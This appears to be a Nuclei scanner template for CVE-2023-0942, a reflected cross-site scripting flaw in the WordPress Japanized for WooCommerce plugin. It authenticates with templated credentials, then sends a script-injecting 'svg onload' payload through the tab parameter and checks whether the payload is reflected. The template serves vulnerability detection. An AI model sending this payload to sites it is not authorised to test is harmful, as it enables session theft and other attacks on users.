http:
- matchers:
  - condition: and
    dsl:
    - status_code_2 == 200
    - contains(body_2, "<svg/onload=alert(document.domain)>") && contains(body_2,
      "woocommerce-for-japan")
    type: dsl
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In

    '
  - 'GET /wp-admin/admin.php?page=wc4jp-options&tab=a</script><svg/onload=alert(document.domain)>
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2023-0942
info:
  author: r3Y3r53
  classification:
    cpe: cpe:2.3:a:artisanworkshop:japanized_for_woocommerce:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2023-0942
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.70358
    epss-score: 0.00384
  description: 'WordPress Japanized for WooCommerce plugin before 2.5.5 is susceptible
    to cross-site scripting via the tab parameter due to insufficient input sanitization
    and output escaping. An attacker can inject arbitrary script in the browser of
    an unsuspecting user in the context of the affected site. This can allow the attacker
    to steal cookie-based authentication credentials and launch other attacks.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement of the affected website.

    '
  metadata:
    framework: wordpress
    max-request: 2
    product: japanized_for_woocommerce
    vendor: artisanworkshop
    verified: true
  name: WordPress Japanized for WooCommerce <2.5.5 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/71aa9460-6dea-49cc-946c-d7d4bf723511
  - https://wordpress.org/plugins/woocommerce-for-japan/
  - https://plugins.trac.wordpress.org/browser/woocommerce-for-japan/trunk/includes/admin/views/html-admin-setting-screen.php#L63
  - https://nvd.nist.gov/vuln/detail/CVE-2023-0942
  - https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&new=2868545%40woocommerce-for-japan%2Ftrunk&old=2863064%40woocommerce-for-japan%2Ftrunk&sfp_email=&sfph_mail=
  remediation: Fixed in version 2.5.5.
  severity: medium
  tags: cve2023,cve,woocommerce-for-japan,wp,wpscan,wordpress,authenticated,xss,woocommerce,plugin,artisanworkshop
